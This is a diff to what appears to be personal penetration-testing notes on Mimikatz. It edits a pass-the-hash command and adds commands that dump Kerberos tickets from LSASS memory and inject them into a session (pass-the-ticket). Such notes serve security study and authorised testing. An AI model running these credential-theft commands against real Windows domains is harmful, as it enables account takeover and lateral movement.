@@ -39,12 +39,22 @@ sekurlsa::msv
 These hashes can be used to perform [[Pass-The-Hash]] attacks by using `mimikatz` to inject an access token for the vicitim user on any command!
 ```powershell
 token::revert
-sekurlsa::pth /user:<username> /domain:<domain-name> /ntlm:<ntlm hash> /run:<cmds goes here>
-sekurlsa:pth ... /run:""
+sekurlsa::pth /user:<username> /domain:<domain-name> /ntlm:<ntlm hash> /run:"<cmds goes here>"
 ```
 
 ## Kerberos Attacks
 Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos and [[Active-Directory-Kerberos-Authenication-Defined]]. It is credential base so understanding [[Active-Directory-Authentication]] in part for [[Active-Directory-Privilege-Escalation]] and [[Active-Directory-Lateral-Movement]] as it is capable of command execution.
+
+Sometimes extraction of Kerberos tickets and sessions keys from LSASS memory with Mimikatz, requiring also SYSTEM privileges:
+```powershell
+privilege::debug
+sekurlsa::tickets /export
+```
+Extract a desired ticket and inject the tickets into the current session, which doesn't require administrator privileges:
+```powershell
+kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-$DOMAIN.kirbi
+```
+Use `klist` to list Kerberos tickets.
 
 ### Kerberos Tickets
 ```powershell
